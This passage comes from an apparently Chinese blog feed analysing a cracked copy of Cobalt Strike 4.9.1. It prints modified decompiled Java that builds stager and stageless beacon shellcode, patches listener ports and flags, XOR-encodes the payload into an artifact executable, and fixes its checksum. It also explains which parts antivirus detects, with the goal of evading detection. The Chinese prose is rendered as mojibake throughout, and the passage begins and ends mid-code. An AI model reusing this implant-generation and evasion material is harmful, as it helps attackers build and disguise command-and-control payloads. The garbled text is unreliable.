class="token punctuation">(</span>var7<span class="token punctuation">,</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_trial</span><span class="token punctuation">(</span><span class="token string">"Added EICAR string to "</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> var10<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var11<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">"å¡«å……A.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¡«å……artifact64big.exe çš„A</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcodeäº¦æˆ–å3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"patchArtifact"</span><span class="token punctuation">,</span> var12<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æœ€ç»ˆåœ¨ä»£ç dumpä¸‹çš„æˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241058846.png" alt="dumpbin"><br>åŒæ ·æˆ‘ä»¬æŠŠfixchesum.binæ”¹æˆå¯æ‰§è¡Œæ–‡ä»¶å°±è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241059790.png" alt="æ”¹æˆexeæ‰§è¡Œ"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241100889.png" alt="ç”Ÿæˆçš„exeå’Œæˆ‘ä»¬dumpçš„å¯¹æ¯”"><br>è¿™ä¸ªé»˜è®¤csprofile é…ç½®çš„shellcodeç”Ÿæˆç›´æ¥ä¼šè¢«ç«ç»’æŸ¥æ€<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241100446.png" alt="é»˜è®¤é…ç½®ç›´æ¥æ€"><br>æˆ‘ä»¬æ¥çœ‹stageless payload generator ç”Ÿæˆå™¨ã€‚å‘ç°æˆ‘æˆ‘ä»¬windowsä¸­åˆ†æçš„ä¸€æ ·<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241101035.png" alt="è¯­è¨€ç”Ÿæˆ"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241101487.png" alt="ç”Ÿæˆrawçš„shellcode"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241102045.png" alt="æˆ‘ä»¬çœ‹åˆ°preè¿™ä¸ªå°±æ˜¯shellcodeç‚¹"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>cs windows stagelesså¯æ‰§è¡Œç¨‹åºç”Ÿæˆè¿‡ç¨‹:<br/><br>(1)åŠ è½½sleeve&#x2F;beacon.x64.dll æ¨¡ç‰ˆ<br/><br>(2)æŠŠæ¨¡æ¿é‡Œé¢çš„Y patch sleepmask ä»c2 profileè¯»å–åˆ°é…ç½®ä»¥åç„¶åä»¥å¼€å§‹AAAABBBBCCCCDDDDEEEEFFFF è£…å…¥é…ç½®<br/><br>(3)ç”Ÿæˆshellcodeæ–‡ä»¶<br/><br>(4)æŠŠç”Ÿæˆçš„shellcodeé€šè¿‡å¼‚æˆ–ä»¥å <br/><br>(5)æŠŠå¼‚æˆ–åçš„shellcodeæ”¾åˆ°artifact64big.exe é‡Œé¢<br/><br>(6)ç„¶åä¿®å¤ä¸€ä¸‹sum<br/><br>(7)ç›´æ¥ç”Ÿæˆexeæ–‡ä»¶<br/><br>é€šè¿‡ä¸Šè¿°ä½ è¦æ˜¯æ€è½¯ä½ è‚¯å®šæ ‡è®°artifact64big.exe æŠŠè¿™ä¸ªç‰¹å¾æ ‡è®°æ­»äº†ã€‚é™æ€ç‰¹å¾ã€‚<br>stagelessä¹Ÿç”¨è¿™ä¸ªè¿™ä¸ªè‚¯å®šè¢«æ ‡è®°è¿‡ äº†ã€‚beacon.x64.dll ä¹Ÿè¢«æ ‡è®°äº†ã€‚å¦å¤–shellcodeä¹Ÿè¢«æ ‡è®°äº†ã€‚æˆ‘ä»¬éœ€è¦ä¿®æ”¹profileæ–‡ä»¶é…åˆè¿›è¡Œå…æ€ã€‚è¿™ä¹Ÿå°±ç†è§£äº†ä¸ºä»€ä¹ˆcsæœ¬è´¨æ˜¯ç©beacon.dllå’Œc2profileäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-ç”Ÿæˆstageçš„exeæ–‡ä»¶ä¸ºä½•è½åœ°è¢«æ€(äºŒ)</title>
      <link href="/penetrationtest/2025/01/articles/bec2e60042695dde/"/>
      <url>/penetrationtest/2025/01/articles/bec2e60042695dde/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å‰é¢æˆ‘ä»¬åˆ†æäº†å¹¶ä¸”ç ´è§£äº†cs 4.9.1ã€‚æˆ‘æ—¥å¸¸æ¸—é€æ¨ªå‘ä¸­ç”¨çš„æ¯”è¾ƒå¤šçš„csä¸ºä»€ä¹ˆå…æ€å¦‚æ­¤éš¾åšã€‚æ€è½¯åˆ°åº•åœ¨æ€ä»€ä¹ˆè¿™ç¯‡æ–‡ç« æˆ‘ä»¬ä»¥<br>csç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶windows exeæ¥è®²è§£ä¸€ä¸‹åŸå› ã€‚ä¸ºä»€ä¹ˆè½åœ°è¢«æ€åˆ°åº•æ˜¯æ€ä»€ä¹ˆã€‚çœ‹æ‡‚è¿™ç¯‡æ–‡ç« éœ€è¦æœ‰å¾ˆæ·±çš„java seç¼–ç¨‹åŸºç¡€ã€‚</p><h2 id="stage-shellcodeç”Ÿæˆåˆ†æ"><a href="#stage-shellcodeç”Ÿæˆåˆ†æ" class="headerlink" title="stage shellcodeç”Ÿæˆåˆ†æ"></a>stage shellcodeç”Ÿæˆåˆ†æ</h2><p>æˆ‘ä»¬æ¥åˆ°payloads é€‰æ‹©windows stager payload å¦‚ä¸‹å›¾ç”Ÿæˆ64ä½å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231023653.png" alt="ç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶"><br>é€‰æ‹©ä¸€ä¸ªç›‘å¬å™¨ç”Ÿæˆã€‚åˆ›å»ºç›‘å¬å™¨çš„è¿‡ç¨‹æˆ‘ä»¬å¿½ç•¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231024117.png" alt="ç”Ÿæˆç•Œé¢"></p><p>æˆ‘ä»¬æ¥ä»ä»£ç åˆ†æç”Ÿæˆæµç¨‹<br>  src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WindowsExecutableDialog</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageå¯¹è¯æ¡†:"</span> <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">=</span> var1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ä»£ç å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231025254.png" alt="ç”Ÿæˆå…³é”®ä»£ç æˆªå›¾"><br>æˆ‘ä»¬çœ‹åˆ°   this.client &#x3D; var1;   æˆ‘ä»¬æ¥æ‰¾var1åˆå§‹åŒ–çš„å‡½æ•° var1 &#x3D;  ã€‚æ¥åˆ°äº†showå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231027466.png" alt="ç”Ÿæˆä»£ç "><br>å½“æˆ‘ä»¬åœ¨ç‚¹å‡» generateçš„æ—¶å€™<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231028297.png" alt="ç‚¹å‡»ç”ŸæˆæŒ‰é’®è§¦å‘å‡½æ•°"><br>è§¦å‘dialogActionå‡½æ•°ã€‚æ ¹æ®æ“ä½œç³»ç»Ÿä½æ•°ç”Ÿæˆstage</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getPayloadStager</span><span class="token punctuation">(</span>var3 <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®é€‰æ‹©è·å– stage  </span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231028881.png" alt="æ ¹æ®å¹³å°ç”Ÿæˆ"><br>ç‚¹å‡» getPayloadStager  å‡½æ•°è·³è½¬åˆ° src&#x2F;common&#x2F;ScListener.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getPayloadStager</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">Stagers</span><span class="token punctuation">.</span><span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç‚¹å‡»Stagers.shellcode   </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token class-name">ScListener</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//shellcodeç”Ÿæˆå‡½æ•°</span><span class="token class-name">GenericStager</span> var3 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç”Ÿæˆshellcodeè°ƒç”¨çš„ç±»å: "</span><span class="token operator">+</span>var3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var3 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> var3<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//å®é™…è°ƒç”¨å­ç±»ä¸º GenericHTTPStager.java æ ¹æ®ç›‘å¬å™¨ç”Ÿæˆå¯¹åº”çš„shellcode</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬çœ‹åˆ°Aç±»åˆå§‹åŒ–ä¸º åˆå§‹åŒ–çš„æ—¶å€™æŠŠlistenerä¹Ÿåˆå§‹åŒ–äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231030833.png" alt="åˆå§‹åŒ–stage"><br>æˆ‘ä»¬ä½¿ç”¨ var3.getClass().getName());  æŠŠå­ç±»æ‰“å°å‡ºæ¥    stagers.BeaconHTTPSStagerX64  å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„ç›‘å¬å™¨æ˜¯https<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231032971.png" alt="æ‰“å°å­ç±»"><br>æˆ‘ä»¬ä»åç¼–è¯‘æºç æ‰¾BeaconHTTPSStagerX64  å‘ç°æ²¡æœ‰generate å‡½æ•°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231032413.png" alt="ç‚¹å‡»æ²¡æœ‰éœ€è¦çš„å‡½æ•°"><br>æ ¹æ®javaç»§æ‰¿å…³ç³»æˆ‘ä»¬å¯»æ‰¾çˆ¶ç±» GenericHTTPSStagerX64 è¿˜æ²¡æœ‰æˆ‘ä»¬ç»§ç»­<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231034202.png" alt="çˆ¶ç±»"><br>ç»§ç»­æ‰¾ GenericHTTPStager<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231034796.png" alt="æ‰¾åˆ°äº†"></p><p>æˆ‘ä»¬å¤åˆ¶ä¸€ä¸‹  src&#x2F;stagers&#x2F;GenericHTTPStager.java æœ€ç»ˆè°ƒç”¨generateå‡½æ•°ã€‚æ³¨æ„ä»£ç é‡Œé¢çš„32-æ˜¯éšæ„æ ‡æ³¨çš„</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"åŠ è½½shellcode: "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">InputStream</span> var1 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//shellcodeå˜æˆstring ç±»å‹ ç¼–ç æ˜¯ ISO8859-1</span><span class="token comment">//System.out.println("åŠ è½½shellcodeåŸæ¥çš„: "+var3);</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span><span class="token string">"32-shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†shellcodeå†™å…¥32-shellcode.bin</span>var1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> var3 <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStagerHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">;</span><span class="token class-name">Packer</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchS</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPortOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPortOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod1.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.exit(0);</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">1453503984</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchI</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">1453503984</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExitOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExitOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagePreamble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchS</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">5555</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSkipOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSkipOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConnectionFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchI</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isSSL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">2069876224</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">2074082816</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getFlagsOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getFlagsOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod4.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var5<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">isin</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pad</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var3<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 